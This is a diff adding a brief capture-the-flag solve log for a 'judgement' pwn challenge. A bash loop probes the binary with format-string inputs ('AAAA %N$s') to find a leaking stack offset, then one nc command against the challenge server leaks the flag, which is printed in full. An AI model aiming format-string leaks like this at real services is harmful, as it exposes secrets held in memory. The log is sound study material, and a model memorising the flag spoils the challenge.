@@ -1,0 +1,6 @@
+$ for i in {1..100}; do echo $i; echo "AAAA %$i\$s" | ./judgement-4da7533784aa31b96ca158fbda9677ee8507781ead6625dc6d577fd5d2ff697c; done
+
+$ echo "AAAA %28\$s" | nc pwn1.chal.ctf.westerns.tokyo 31729
+Flag judgment system
+Input flag >> AAAA TWCTF{R3:l1f3_1n_4_pwn_w0rld_fr0m_z3r0}
+Wrong flag...
